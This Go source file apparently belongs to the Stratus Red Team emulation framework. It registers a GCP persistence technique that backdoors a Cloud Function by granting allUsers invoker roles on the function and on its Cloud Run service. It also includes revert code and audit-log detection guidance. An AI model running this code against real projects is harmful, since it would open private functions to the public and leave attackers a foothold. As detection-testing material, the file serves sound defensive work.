package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	cloudfunctions "google.golang.org/api/cloudfunctions/v2"
	run "google.golang.org/api/run/v2"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.persistence.backdoor-cloud-function",
		FriendlyName: "Backdoor a Cloud Function by Granting Public Invoke Access",
		Description: `
Grants unauthenticated invocation access to a Cloud Functions v2 function by adding
an IAM binding for <code>allUsers</code>. An attacker who has gained access to a GCP
project with Cloud Functions deployed may modify the function's IAM policy to expose
internal logic or data-processing pipelines to the public internet, enabling them to
trigger the function without credentials even after they lose their original access.

Note that the public access can be disabled at organization level. If that's the case,
the technique will still report as detonated because GCP returns a success to the call
and then ignores the change. It still does generate a audit log that can be used for
detection.

Warm-up:

- Create a Cloud Functions v2 function with a simple Python hello-world handler

Detonation:

- Read the current IAM policy for the function
- Add a binding granting <code>roles/cloudfunctions.invoker</code> to <code>allUsers</code>
  on the Cloud Functions resource
- Add a binding granting <code>roles/run.invoker</code> to <code>allUsers</code> on the
  underlying Cloud Run service (Cloud Functions v2 enforces invocation auth at the
  Cloud Run layer)

Revert:

- Remove the <code>allUsers</code> bindings from both the function and Cloud Run service

References:

- https://cloud.google.com/functions/docs/securing/managing-access-iam
- https://cloud.google.com/functions/docs/reference/rest/v2/projects.locations.functions/setIamPolicy
- https://www.tenable.com/blog/confusedfunction-a-privilege-escalation-vulnerability-impacting-gcp-cloud-functions
`,
		Detection: `
Identify when a Cloud Function or its underlying Cloud Run service IAM policy is
modified to grant access to <code>allUsers</code> or <code>allAuthenticatedUsers</code>
by monitoring for
<code>google.cloud.functions.v2.CloudFunctionsService.SetIamPolicy</code> and
<code>google.cloud.run.v2.Services.SetIamPolicy</code> events in GCP Admin Activity
audit logs where the request adds a binding with those principals. Cloud Functions v2
enforces invocation authentication at the Cloud Run layer, so the Cloud Run
<code>SetIamPolicy</code> event is the more critical signal.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// cloudRunServiceName derives the Cloud Run service resource name from a Cloud
// Functions v2 resource name. Cloud Functions v2 is backed by Cloud Run and the
// two services share the same resource identifier; only the resource type differs.
//
// Input:  projects/{project}/locations/{location}/functions/{name}
// Output: projects/{project}/locations/{location}/services/{name}
func cloudRunServiceName(functionName string) string {
	return strings.Replace(functionName, "/functions/", "/services/", 1)
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	functionName := params["function_name"]
	serviceName := cloudRunServiceName(functionName)
	ctx := context.Background()

	// --- Cloud Functions layer ---
	cfSvc, err := cloudfunctions.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Functions client: %w", err)
	}
	fnSvc := cfSvc.Projects.Locations.Functions

	cfPolicy, err := fnSvc.GetIamPolicy(functionName).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy for function %s: %w", functionName, err)
	}
	cfPolicy.Bindings = append(cfPolicy.Bindings, &cloudfunctions.Binding{
		Role:    "roles/cloudfunctions.invoker",
		Members: []string{"allUsers"},
	})
	log.Printf("Granting allUsers:roles/cloudfunctions.invoker on Cloud Function %s\n", functionName)
	_, err = fnSvc.SetIamPolicy(functionName, &cloudfunctions.SetIamPolicyRequest{
		Policy: cfPolicy,
	}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to set IAM policy for function %s: %w", functionName, err)
	}

	// --- Cloud Run layer ---
	// Cloud Functions v2 enforces invocation authentication at the Cloud Run
	// service level, so allUsers must be granted roles/run.invoker there too.
	runSvc, err := run.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Run client: %w", err)
	}
	runPolicy, err := runSvc.Projects.Locations.Services.GetIamPolicy(serviceName).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy for Cloud Run service %s: %w", serviceName, err)
	}
	runPolicy.Bindings = append(runPolicy.Bindings, &run.GoogleIamV1Binding{
		Role:    "roles/run.invoker",
		Members: []string{"allUsers"},
	})
	log.Printf("Granting allUsers:roles/run.invoker on Cloud Run service %s\n", serviceName)
	_, err = runSvc.Projects.Locations.Services.SetIamPolicy(serviceName, &run.GoogleIamV1SetIamPolicyRequest{
		Policy: runPolicy,
	}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to set IAM policy for Cloud Run service %s: %w", serviceName, err)
	}

	// Verify the Cloud Run binding took effect — this is the layer that actually
	// controls invocation. An org policy can silently strip allUsers here.
	updatedRun, err := runSvc.Projects.Locations.Services.GetIamPolicy(serviceName).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to verify IAM policy for Cloud Run service %s: %w", serviceName, err)
	}
	for _, b := range updatedRun.Bindings {
		if b.Role == "roles/run.invoker" {
			for _, m := range b.Members {
				if m == "allUsers" {
					log.Printf("Cloud Function %s is now publicly invocable by allUsers\n", functionName)
					return nil
				}
			}
		}
	}

	log.Printf("SetIamPolicy was accepted and audit log events were generated, but the allUsers binding was stripped by an org policy — the function is NOT publicly accessible\n")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	functionName := params["function_name"]
	serviceName := cloudRunServiceName(functionName)
	ctx := context.Background()

	cfSvc, err := cloudfunctions.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Functions client: %w", err)
	}
	fnSvc := cfSvc.Projects.Locations.Functions

	runSvc, err := run.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Run client: %w", err)
	}

	// Retry loop to handle transient IAM consistency delays after detonate.
	const maxAttempts = 10
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		// Revert Cloud Functions binding.
		cfPolicy, err := fnSvc.GetIamPolicy(functionName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to get IAM policy for function %s: %w", functionName, err)
		}
		cfPolicy.Bindings = removeAllUsers(cfPolicy.Bindings, "roles/cloudfunctions.invoker")
		log.Printf("Removing allUsers:roles/cloudfunctions.invoker from Cloud Function %s\n", functionName)
		_, err = fnSvc.SetIamPolicy(functionName, &cloudfunctions.SetIamPolicyRequest{
			Policy: cfPolicy,
		}).Context(ctx).Do()
		if err != nil {
			log.Printf("SetIamPolicy (Cloud Functions) attempt %d/%d failed: %v — retrying\n", attempt, maxAttempts, err)
			time.Sleep(3 * time.Second)
			continue
		}

		// Revert Cloud Run binding.
		runPolicy, err := runSvc.Projects.Locations.Services.GetIamPolicy(serviceName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to get IAM policy for Cloud Run service %s: %w", serviceName, err)
		}
		runBindings := make([]*run.GoogleIamV1Binding, 0, len(runPolicy.Bindings))
		for _, b := range runPolicy.Bindings {
			if b.Role != "roles/run.invoker" {
				runBindings = append(runBindings, b)
				continue
			}
			remaining := make([]string, 0, len(b.Members))
			for _, m := range b.Members {
				if m != "allUsers" {
					remaining = append(remaining, m)
				}
			}
			if len(remaining) > 0 {
				b.Members = remaining
				runBindings = append(runBindings, b)
			}
		}
		runPolicy.Bindings = runBindings
		log.Printf("Removing allUsers:roles/run.invoker from Cloud Run service %s\n", serviceName)
		_, err = runSvc.Projects.Locations.Services.SetIamPolicy(serviceName, &run.GoogleIamV1SetIamPolicyRequest{
			Policy: runPolicy,
		}).Context(ctx).Do()
		if err != nil {
			log.Printf("SetIamPolicy (Cloud Run) attempt %d/%d failed: %v — retrying\n", attempt, maxAttempts, err)
			time.Sleep(3 * time.Second)
			continue
		}

		log.Printf("Successfully removed public invoke access from Cloud Function %s\n", functionName)
		return nil
	}

	return fmt.Errorf("failed to revert IAM policy for function %s after %d attempts", functionName, maxAttempts)
}

// removeAllUsers removes allUsers from the named role binding, dropping the
// binding entirely if it becomes empty.
func removeAllUsers(bindings []*cloudfunctions.Binding, role string) []*cloudfunctions.Binding {
	filtered := make([]*cloudfunctions.Binding, 0, len(bindings))
	for _, b := range bindings {
		if b.Role != role {
			filtered = append(filtered, b)
			continue
		}
		remaining := make([]string, 0, len(b.Members))
		for _, m := range b.Members {
			if m != "allUsers" {
				remaining = append(remaining, m)
			}
		}
		if len(remaining) > 0 {
			b.Members = remaining
			filtered = append(filtered, b)
		}
	}
	return filtered
}
